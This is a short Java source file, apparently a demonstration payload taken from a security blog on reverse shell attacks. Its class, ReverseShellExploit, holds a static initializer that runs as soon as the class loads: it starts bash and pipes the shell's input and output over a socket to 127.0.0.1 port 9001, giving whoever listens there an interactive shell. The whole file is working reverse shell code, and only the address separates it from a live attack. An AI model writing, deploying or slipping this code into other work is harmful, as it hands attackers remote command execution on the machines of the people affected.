import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

// Source: https://snyk.io/blog/reverse-shell-attack/
public class ReverseShellExploit {
    static {
        try {
            Process process = new ProcessBuilder("bash").redirectErrorStream(true).start();
            Socket socket = new Socket("127.0.0.1", 9001);
            InputStream pInput = process.getInputStream();
            InputStream pError = process.getErrorStream();
            InputStream sInput = socket.getInputStream();

            OutputStream pOutput = process.getOutputStream();
            OutputStream sOutput = socket.getOutputStream();

            while (!socket.isClosed()) {
                while (pInput.available() > 0) sOutput.write(pInput.read());
                while (pError.available() > 0) sOutput.write(pError.read());
                while (sInput.available() > 0) pOutput.write(sInput.read());
                sOutput.flush();
                pOutput.flush();
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}